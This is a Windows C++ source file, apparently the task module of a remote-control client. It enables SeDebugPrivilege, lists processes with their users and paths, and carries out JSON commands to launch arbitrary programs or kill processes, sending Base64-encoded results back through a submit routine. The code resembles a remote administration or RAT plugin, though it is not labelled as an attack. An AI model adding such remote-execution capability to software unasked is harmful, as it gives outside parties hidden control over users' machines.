#include"MyStdAfx.h"

void EnumProcess(Json::Value *tasks)
{
	string utf8_str;
	Json::Value task;
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	PWTS_PROCESS_INFO processInfo;
	DWORD dwCount;
	WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE,0,1,&processInfo,&dwCount);

	hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(hProcessSnap==INVALID_HANDLE_VALUE)
	{
		Msg("CreateToolhelp32SnapshotError.\r\n");
		return;
	}
	pe32.dwSize=sizeof(PROCESSENTRY32);

	if(!Process32First(hProcessSnap,&pe32))
	{
		Msg("Process32FirstError.\r\n");
		CloseHandle(hProcessSnap);
		return;
	}
	do
	{
		task.clear();
		task["name"]=Json::Value(pe32.szExeFile);
		task["pid"]=Json::Value((int)pe32.th32ProcessID);
		
//		Msg("Name:%s\r\n",pe32.szExeFile);
//		Msg("PID:%d\r\n",pe32.th32ProcessID);
//		Msg("Thread:%d\r\n",pe32.cntThreads);

		dwPriorityClass=0;
		hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
		if(hProcess==NULL)
		{
			task["user"]=Json::Value("SYSTEM");
			task["mem"]=Json::Value("NULL");
			task["path"]=Json::Value("NULL");
			(*tasks)["task"].append(task);
//			Msg("OpenProcessError.\r\n\r\n");
			continue;
		}
		else
		{
			dwPriorityClass=GetPriorityClass(hProcess);
			if(!dwPriorityClass)
			{
				Msg("GetPriorityClassError.\r\n");
			}
			PROCESS_MEMORY_COUNTERS pmc;
			if(GetProcessMemoryInfo(hProcess,&pmc,sizeof(pmc)))
			{
//				Msg("Memory:%dKB\r\n",pmc.PagefileUsage/1024);
				task["mem"]=Json::Value((int)pmc.PagefileUsage/1024);
				//	printf("\tPeakPagefileUsage:%d\n",pmc.PeakPagefileUsage);
			}
			for(unsigned int i=0;i<dwCount;i++)
			{
				if(pe32.th32ProcessID==processInfo[i].ProcessId)
				{
				//	Msg("UserName:%s\r\n",GetUserNameFromUserSid(processInfo[i].pUserSid));
					SID_NAME_USE snu;
					TCHAR szUser[_MAX_PATH];
					DWORD chUser=_MAX_PATH;
					PDWORD pcchUser=&chUser;
					TCHAR szDomain[_MAX_PATH];
					DWORD chDomain=_MAX_PATH;
					PDWORD pcchDomain=&chDomain;
					if(LookupAccountSid(NULL,processInfo[i].pUserSid,szUser,pcchUser,szDomain,pcchDomain,&snu))
					{
						if (strlen(szUser)!=0)
						{
							task["user"]=Json::Value(szUser);
						}
						else
						{
							task["user"]=Json::Value("Administrator");
						}
						break;
					}
				}
			}
			CloseHandle(hProcess);
		}

		HANDLE hModuleSnap=INVALID_HANDLE_VALUE;
		MODULEENTRY32 me32;

		hModuleSnap=CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,pe32.th32ProcessID);
		if(hModuleSnap==INVALID_HANDLE_VALUE)
		{
			Msg("CreateToolhelp32Snapshot(of modules)Error.\r\n\r\n");
			task["path"]=Json::Value("NULL");
			(*tasks)["task"].append(task);
			continue;
		}

		me32.dwSize=sizeof(MODULEENTRY32);

		if(!Module32First(hModuleSnap,&me32))
		{
			Msg("Module32First Error.\r\n");
			CloseHandle(hModuleSnap);
			continue;
		}
//		Msg("Module:%s\r\n",me32.szModule);
//		Msg("Executable:%s\r\n",me32.szExePath);

		task["path"]=Json::Value(me32.szExePath);
		(*tasks)["task"].append(task);
//		Msg("ProcessID:%d\r\n\r\n",me32.th32ProcessID);
		CloseHandle(hModuleSnap);
	}while(Process32Next(hProcessSnap,&pe32));
	CloseHandle(hProcessSnap);	
}

int EnableDebugPrivilege()
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;

	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken))
	{
		Msg("OpenProcessToken Error.\r\n");
		return -1;
	}
	if(!LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&sedebugnameValue))
	{
		Msg("LookupPrivilegeValue Error.\r\n");
		return -1;
	}

	tkp.PrivilegeCount=1;
	tkp.Privileges[0].Luid=sedebugnameValue;
	tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	if(!AdjustTokenPrivileges(hToken,FALSE,&tkp,sizeof(tkp),NULL,NULL))
	{
		Msg("AdjustTokenPrivileges Error.\r\n");
		return -1;
	}
	return 1;
}


void TaskOperate(void *cmd)
{
	string Base64Result,Result;
	Json::Value json_cmd_content;
	Json::Reader reader;
	Json::FastWriter fast_writer;

	cmdinfo *pci=(cmdinfo*)cmd;
	if (reader.parse(pci->cmd_content.c_str(), json_cmd_content))
	{
		string operate=fast_writer.write(json_cmd_content["operate"]);
		if (operate.find("run")!=string::npos)
		{
			string path;
			PathDecode(json_cmd_content["path"].asString(),path);
			STARTUPINFO hs_StartInfo;
			PROCESS_INFORMATION hs_ProcessInformation;
			memset(&hs_StartInfo,0,sizeof(STARTUPINFO));
			memset(&hs_ProcessInformation,0,sizeof(PROCESS_INFORMATION));
			if (!CreateProcess(NULL,(char *)path.c_str(),NULL,NULL,1,0,NULL,NULL,&hs_StartInfo,&hs_ProcessInformation))
			{
				LPSTR lpBuffer=NULL;    
				FormatMessage ( FORMAT_MESSAGE_ALLOCATE_BUFFER|FORMAT_MESSAGE_IGNORE_INSERTS|FORMAT_MESSAGE_FROM_SYSTEM,
					NULL,GetLastError(),LANG_NEUTRAL,(LPTSTR) & lpBuffer,0 ,NULL);
				if(lpBuffer==NULL)
				{
					Result=Result+"启动\""+path.c_str()+"\"时出错,原因:未知.\n";
				}
				Result=Result+"启动\""+path.c_str()+"\"时出错,原因:"+lpBuffer;
				LocalFree (lpBuffer);
			}
			else
			{
				Result+="Success";
			}
		}

		if (operate.find("terminal")!=string::npos)
		{
			HANDLE hProcess=0;
			Json::Value killlist=json_cmd_content["killlist"];
			int iSize = killlist.size();

			for (int nIndex=0;nIndex<iSize;++nIndex )
			{
				hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,killlist[nIndex]["pid"].asUInt());
				if(hProcess==NULL)
				{
					Result+="进程：\""+killlist[nIndex]["name"].asString()+"\"拒绝访问\n";
					continue;
				}
				if (!TerminateProcess(hProcess,0))
				{
					Result+="进程：\""+killlist[nIndex]["name"].asString()+"\"拒绝访问\n";
				}
				else
				{
					Result+="进程：\""+killlist[nIndex]["name"].asString()+"\"成功结束\n";
				}
			}
		}
	}
	else
	{
		ANSIToUTF8("Json Format Error",&Result);
	}
	Base64Encode(reinterpret_cast<const unsigned char*>(Result.c_str()),Result.length(),Base64Result);
	Replace_plus(Base64Result);
	SubmitResult(pci,Base64Result.c_str());

}

void TaskList(void *cmd)
{
	Json::FastWriter fast_writer;
	Json::Value tasks;
	string utf8_result;

	string Base64Result;
	cmdinfo *pci=(cmdinfo*)cmd;

	if(EnableDebugPrivilege()==1)
	{
		EnumProcess(&tasks);
	}
	ANSIToUTF8((char *)fast_writer.write(tasks).c_str(),&utf8_result);
	Base64Encode(reinterpret_cast<const unsigned char*>(utf8_result.c_str()),utf8_result.length(),Base64Result);
	Replace_plus(Base64Result);
	SubmitResult(pci,Base64Result.c_str());
	Base64Result.erase();
	utf8_result.erase();
	tasks.clear();
}